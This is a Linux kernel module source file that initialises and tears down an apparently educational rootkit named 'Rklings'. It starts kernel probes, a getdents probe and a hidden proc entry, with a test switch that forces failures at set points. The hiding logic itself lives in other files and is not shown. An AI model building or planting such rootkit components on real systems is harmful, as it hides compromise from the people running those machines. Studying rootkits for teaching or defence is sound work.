// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>

#include "rootkit.h"

#if RKLINGS_FAIL_POINT < 0 || RKLINGS_FAIL_POINT > 6
#error "unknown RKLINGS_FAIL_POINT"
#endif

static struct rk_state *state;

static int __init rk_init(void)
{
	int error;

	if (RKLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT)
		return -ECANCELED;

	state = rk_state_create();
	if (IS_ERR(state)) {
		error = PTR_ERR(state);
		state = NULL;
		return error;
	}

	error = rk_probes_start(state);
	if (error)
		goto destroy_state;

	error = rk_getdents_probe_start(state);
	if (error)
		goto stop_probes;

	error = rk_hidden_proc_publish();
	if (error)
		goto stop_getdents_probe;

	error = rk_proc_publish(state);
	if (error)
		goto unpublish_hidden_proc;

	return 0;

unpublish_hidden_proc:
	rk_hidden_proc_unpublish();
stop_getdents_probe:
	rk_getdents_probe_stop();
stop_probes:
	rk_probes_stop();
destroy_state:
	rk_state_destroy(state);
	state = NULL;
	return error;
}

static void __exit rk_exit(void)
{
	rk_proc_unpublish();
	rk_hidden_proc_unpublish();
	rk_getdents_probe_stop();
	rk_probes_stop();
	rk_state_destroy(state);
	state = NULL;
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings kernel module");
